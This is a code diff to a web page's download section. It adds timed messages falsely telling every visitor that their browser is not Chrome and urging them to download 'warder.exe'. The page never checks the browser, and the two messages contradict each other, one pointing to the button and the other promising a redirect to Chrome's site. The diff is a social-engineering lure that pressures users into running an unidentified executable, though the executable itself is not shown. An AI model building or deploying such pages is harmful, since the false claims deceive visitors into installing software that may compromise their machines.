@@ -94,11 +94,22 @@
     </ul>
 
     <br>
+
+    <!-- 🔽 ADDED MESSAGE ABOVE BUTTON -->
+    <div id="messageTop" style="display: none; color: #ff6f61; margin-bottom: 10px;">
+        Your browser is not Chrome, so download it from this download button to continue.
+    </div>
+
     <!-- Download button opens thank-you page -->
     <a href="warder.exe" download id="downloadLink">
         <button onclick="openThankYou()">Download Now</button>
     </a>
-    
+
+    <!-- 🔽 ADDED MESSAGE BELOW BUTTON -->
+    <div id="messageBottom" style="display: none; color: #ff6f61; margin-top: 10px;">
+        Your browser is not Chrome, so we are redirecting you to the Chrome website to download it.
+    </div>
+
     <script>
     function openThankYou() {
         // Open thank-you page in new tab
@@ -108,14 +119,15 @@
         setTimeout(() => {
             if (thankYouTab) thankYouTab.close();
         }, 2000);
-    
-        // Optional: you can trigger the download via JS as well
-        // document.getElementById('downloadLink').click();
     }
+
+    // 🔽 SHOW MESSAGES AFTER 5 SECONDS
+    setTimeout(() => {
+        document.getElementById('messageTop').style.display = 'block';
+        document.getElementById('messageBottom').style.display = 'block';
+    }, 5000);
     </script>
-    
-    
-    </a>
+
 </main>
 
 <footer>
